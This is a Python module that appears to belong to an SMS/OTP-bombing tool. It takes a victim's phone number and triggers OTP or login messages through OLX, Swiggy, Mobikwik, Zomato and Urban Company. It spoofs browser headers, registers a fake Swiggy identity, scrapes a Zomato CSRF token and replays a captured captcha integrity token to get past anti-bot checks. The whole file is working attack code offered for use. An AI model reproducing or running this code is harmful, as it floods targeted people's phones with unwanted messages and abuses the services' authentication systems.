import requests

def run_apis5(mobile_no):
    results = []
    
    if not mobile_no.startswith("+"):
        number = "+91" + mobile_no
    else:
        number = mobile_no

    # --- API 25: OLX ---
    try:
        headers25 = {
            'Host': 'www.olx.in',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'x-panamera-fingerprint': '9293924820144a61d3464cbd1b09fb7f#1758791440451',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
            'accept': '*/*',
            'DNT': '1',
            'content-type': 'application/json',
            'Origin': 'https://www.olx.in',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.olx.in/en-in/items/q-login',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7',
        }

        json_data25 = {
            'grantType': 'retry',
            'method': 'call',
            'phone': number,
            'language': 'en-IN'
        }

        r25 = requests.post(
            'https://www.olx.in/api/auth/authenticate?lang=en-IN',
            headers=headers25,
            json=json_data25,
            timeout=10
        )
        results.append({"service": "OLX", "status": r25.status_code, "response": r25.text})
        print(f"OLX: {r25.status_code}")
    except Exception as e:
        results.append({"service": "OLX", "status": "Error", "response": str(e)})
        print(f"OLX Error: {e}")

    # --- API 26: Swiggy Signup ---
    try:
        headers26 = {
            '__fetch_req__': 'true',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.swiggy.com',
            'platform': 'dweb',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.swiggy.com/',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        }

        json_data26 = {
            'mobile': number.replace("+91", ""),
            'name': 'Robert Hofman',
            'email': '5n06uwcbog@jkotypc.com',
            'referral': '',
            'otp': '',
            '_csrf': '',
        }

        response = requests.post('https://www.swiggy.com/dapi/auth/signup', headers=headers26, json=json_data26, timeout=10)
        results.append({"service": "Swiggy Signup", "status": response.status_code, "response": response.text})
        print(f"Swiggy Signup: {response.status_code}")
    except Exception as e:
        results.append({"service": "Swiggy Signup", "status": "Error", "response": str(e)})
        print(f"Swiggy Signup Error: {e}")

    # --- API 27: Swiggy OTP ---
    try:
        headers27 = {
            '__fetch_req__': 'true',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.swiggy.com',
            'platform': 'dweb',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.swiggy.com/',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        }

        json_data27 = {
            'mobile': number.replace("+91", ""),
            '_csrf': '',
        }

        resp = requests.post('https://www.swiggy.com/dapi/auth/sms-otp', headers=headers27, json=json_data27, timeout=10)
        results.append({"service": "Swiggy OTP", "status": resp.status_code, "response": resp.text})
        print(f"Swiggy OTP: {resp.status_code}")
    except Exception as e:
        results.append({"service": "Swiggy OTP", "status": "Error", "response": str(e)})
        print(f"Swiggy OTP Error: {e}")

    # --- API 28: Mobikwik ---
    try:
        headers28 = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://e-pay.mobikwik.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://e-pay.mobikwik.com/',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x84) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'x-mclient': '27',
        }

        params28 = {
            'epayVersion': 'v1',
        }

        json_data28 = {
            'id': 'MNRF-68d57d9ce4b0126bac8bc8ba',
            'cell': number.replace("+91", ""),
            'otpSource': 1,
        }

        response = requests.post(
            'https://walletapi.mobikwik.com/walletapis/redirectflow/otpgenrate/resendotp',
            params=params28,
            headers=headers28,
            json=json_data28,
            timeout=10
        )
        results.append({"service": "Mobikwik", "status": response.status_code, "response": response.text})
        print(f"Mobikwik: {response.status_code}")
    except Exception as e:
        results.append({"service": "Mobikwik", "status": "Error", "response": str(e)})
        print(f"Mobikwik Error: {e}")

    # --- API 29: Zomato ---
    try:
        session = requests.Session()
        csrf_url = "https://www.zomato.com/webroutes/auth/csrf"
        res = session.get(csrf_url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "Referer": "https://www.zomato.com/indore/delivery"
        }, timeout=10)
        csrf_token = res.json().get("csrf")

        files = {
            "country_id": (None, "1"),
            "number": (None, number.replace("+91", "")),
            "type": (None, "initiate"),
            "csrf_token": (None, csrf_token),
            "lc": (None, "659bd17296ba4105866ed2559549a922"),
            "verification_type": (None, "sms"),
        }

        resp = session.post("https://accounts.zomato.com/login/phone", files=files, timeout=10)
        results.append({"service": "Zomato", "status": resp.status_code, "response": resp.text})
        print(f"Zomato: {resp.status_code}")
    except Exception as e:
        results.append({"service": "Zomato", "status": "Error", "response": str(e)})
        print(f"Zomato Error: {e}")

    # --- API 30: Urban Company ---
    try:
        headers30 = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.urbancompany.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'react-bundle-version': '503',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'x-brand-key': 'urbanCompany',
            'x-device-id': 'v-1758819710',
            'x-device-os': 'desktop_web',
            'x-preferred-language': 'english',
            'x-version-code': '4.273.58',
            'x-version-name': 'web_v4.273.58',
        }

        json_data30 = {
            'city_key': None,
            'countryId': 'IND',
            'phoneNumber': number.replace("+91", ""),
            'integrityToken': '0.7mCEQBEjvzOD-BNLhoFLrkg6gmIW_R7fw5vHYAD1GXI1I-qZWxuFuZ51BX6991YvE5prKWBzk7yyswpUm9KbZ3QW4GVnswdACKtWbWJjTCdlS_O5FkIfdPa4POTE7aPRf6o6U67_3cFtfYjYwC4PT_BYOJ0PXvKdXkwKEDgozb5LpdkYrOPN4BkxjPdtRSLkmUfMZfnFe7K8wJIq4ojDLs79N2pjHpPadcRaagt8Mc6RJcnWDua3pi9UYhYsPGQ-Ee4N784S1bzR1H8N0tmh-WD40EGwreFIwaSTKhiBsoeIJMHeko_VJCo43c0GNC8PvaejepHp8oYe9WB4WDlYNKShJQkTsGiCxs1JJa4LvYasadvB_44d3FrwXsTSum9oTDFjIT7PHSPFftpEVYVFEFoPHRp5VbvYsVe9_8dRbxCYSPKaJgDSs_Ap7Lhc0qibHOrEPTaZYXFIpgfXmBrs_svG-4ZHNG0wcoNv8njq95tnl6mqf_b2MC2ZjefkwrPmssCA6vWc_KbxsV4mrNBsUaHSj2_eGNFtU5Rp4L0y9HivvMo0mJeyayiymmug63hY9wdCSuGrdCqBjlpnVM6jTxbYjL7Y32DrhX0Vec294onwRCok11p9CLY1MG1hhMlur70MFSaQ4dvIQgYA628pTBDVfVEyU5SHmyltgJiGL_KLESkEbU9YB6bi4s9Wk70z04XpVEMlLnP0iNn6_Nn5thercTDKEJQlLsWMayTDjqf6OpALSW1aBbs27MMlzTpr0iol7K8fkpNYkVZiy5fCaFzX4VBvrcTJerzY6tD1mu8vyvAp-vEcTPyzm43pTr7FimwKZj1CemnzVRXt0MgtAGQLY2oJ3c_HHYJuDigWvT6sWu-bSKwUIBUt9-Vw9GuMQj8AlG_CiZ2H2K3BZWLTPTJwZrNEtYqTK1q5bFRXNrAfTXFSunF61xeriFg5y1HC9ml228xSqr-eQ9ty7J3XUw.besfJV3LJwFiY4aeoaSnlA.668696d45fc89b33f6dfcccb14c979930cf7d9e581c353203ccd4466fadfc08c',
            'integrityType': 'captcha',
            'userType': 'customer',
            'loginType': 'otp',
        }

        response = requests.post('https://www.urbanclap.com/api/v2/growth/web/initiateLogin', headers=headers30, json=json_data30, timeout=10)
        results.append({"service": "Urban Company", "status": response.status_code, "response": response.text})
        print(f"Urban Company: {response.status_code}")
    except Exception as e:
        results.append({"service": "Urban Company", "status": "Error", "response": str(e)})
        print(f"Urban Company Error: {e}")

    return results
